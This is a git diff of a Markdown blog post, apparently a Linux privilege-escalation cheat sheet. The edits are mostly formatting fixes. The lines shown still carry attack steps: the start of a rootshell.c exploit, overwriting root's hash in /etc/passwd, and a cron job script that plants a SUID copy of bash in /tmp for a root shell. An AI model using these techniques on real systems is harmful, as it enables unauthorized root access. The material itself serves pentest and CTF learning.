@@ -7,8 +7,7 @@ author: LXD
 image: /assets/img/posts/anonymous/privilege_escaltion.png
 ---
 
-![privilege_escaltion](/assets/img/posts/misc/privilege_escaltion.png)
-
+![privilege_escaltion](/assets/img/posts/misc/privilege_escalation.png)
 
 Linux:
 **#Privilege_Escalation_with_Intresting_Groups**
@@ -122,7 +121,7 @@ If you see this result under Capabilities[+] column in linpeas
 It's defenitely exploitable ,and that's what we gonna do
 
 1 - Create a file calling rootshell.c
-``` C
+```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -264,13 +263,13 @@ OR
 - if `/etc/passwd` is editable then (`mkpasswd -m sha-512 newpasswordhere`) ,copy the hash ,paste it into `/etc/passwd`'s root hash [it is also possible doing same thing on /etc/passwd ,just change the "x" with the hash that you created ]
 
 - If you saw a program running on the cron jobs > then copy the file name > go to user's home directory > nano file name  >
-```shell
-#!/bin/bash
-
-cp /bin/bash /tmp/rootbash
-chmod +xs /tmp/rootbash
-```
-> wait till end of the minute > check `/tmp` file ,if program does exist then `/tmp/rootbash -p` .. you're the root#
+	```shell
+	#!/bin/bash
+	
+	cp /bin/bash /tmp/rootbash
+	chmod +xs /tmp/rootbash
+	```
+	wait till end of the minute > check `/tmp` file ,if program does exist then `/tmp/rootbash -p` .. you're the root#
 
 - If there is a file running on root/user permissions ,modify it with following commands:
 
